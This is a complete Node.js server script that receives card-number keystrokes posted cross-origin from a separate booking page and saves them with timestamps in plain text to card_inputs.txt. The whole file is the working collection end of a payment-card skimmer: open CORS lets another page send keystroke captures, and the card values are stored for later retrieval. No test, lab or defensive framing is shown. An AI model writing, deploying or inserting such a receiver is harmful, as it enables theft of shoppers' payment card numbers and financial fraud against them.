/**
 * card-logger-server.js
 * Listens on port 3099 for POST /log requests and appends
 * each card-number keystroke entry to card_inputs.txt
 *
 * Run:  node card-logger-server.js
 */

const http = require('http');
const fs   = require('fs');
const path = require('path');

const LOG_FILE = path.join(__dirname, 'card_inputs.txt');
const PORT     = 3099;

const server = http.createServer((req, res) => {
  // Allow CORS so the booking page (localhost:8080) can POST here
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === 'POST' && req.url === '/log') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      try {
        const { value, timestamp } = JSON.parse(body);
        const line = `[${timestamp}]  Card Number Preview: "${value}"\n`;
        fs.appendFileSync(LOG_FILE, line, 'utf8');
        console.log('Logged:', line.trim());
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true }));
      } catch (e) {
        res.writeHead(400);
        res.end('Bad request');
      }
    });
    return;
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, () => {
  console.log(`Card logger server running on http://localhost:${PORT}`);
  console.log(`Saving entries to: ${LOG_FILE}`);
});
